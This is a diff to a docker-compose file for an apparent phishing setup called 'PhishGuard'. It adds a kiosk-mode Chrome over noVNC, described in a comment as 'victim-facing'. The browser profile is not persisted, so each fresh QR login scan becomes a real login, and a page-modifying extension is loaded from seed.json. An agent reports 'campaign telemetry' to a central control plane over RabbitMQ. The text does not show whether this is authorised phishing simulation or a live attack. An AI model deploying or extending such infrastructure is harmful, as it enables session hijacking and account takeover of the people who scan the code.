@@ -18,9 +18,32 @@ services:
     environment:
       # Chrome opens this on launch (see novnc/start.sh).
       START_URL: ${START_URL:-about:blank}
+      # Victim-facing: full-screen, no tab strip / address bar.
+      KIOSK: "1"
     ports:
       - "${NOVNC_PORT:-6080}:6080"   # noVNC web UI
     volumes:
       - ../site-tweaker/site-tweaker:/extensions/site-tweaker:ro
+    # NOTE: Chrome's profile is intentionally NOT persisted — each deploy starts
+    # logged out (fresh QR) so a scan is a real login. Modifications are
+    # re-applied from seed.json on every load, so they don't need the profile.
     shm_size: 2gb
+    restart: unless-stopped
+
+  # The agent connects OUT to the central RabbitMQ (PHISHGUARD_AMQP_URL) and
+  # reports campaign telemetry back to the control plane (STRATEGY.md section 5).
+  # It observes the browser over CDP (coarse metadata only — no secrets).
+  agent:
+    build:
+      context: ../agent
+      dockerfile: deployment/Dockerfile.runtime
+    environment:
+      PHISHGUARD_AMQP_URL: ${PHISHGUARD_AMQP_URL:-amqp://guest:guest@rabbitmq:5672/}
+      PHISHGUARD_AGENT_ID: ${PHISHGUARD_AGENT_ID:?set PHISHGUARD_AGENT_ID}
+      PHISHGUARD_CAMPAIGN_ID: ${PHISHGUARD_CAMPAIGN_ID:?set PHISHGUARD_CAMPAIGN_ID}
+      PHISHGUARD_BROWSER_CDP_URL: http://novnc:9222
+      PHISHGUARD_HEARTBEAT_INTERVAL_SECONDS: "30"
+      PHISHGUARD_LOG_JSON: "true"
+    depends_on:
+      - novnc
     restart: unless-stopped
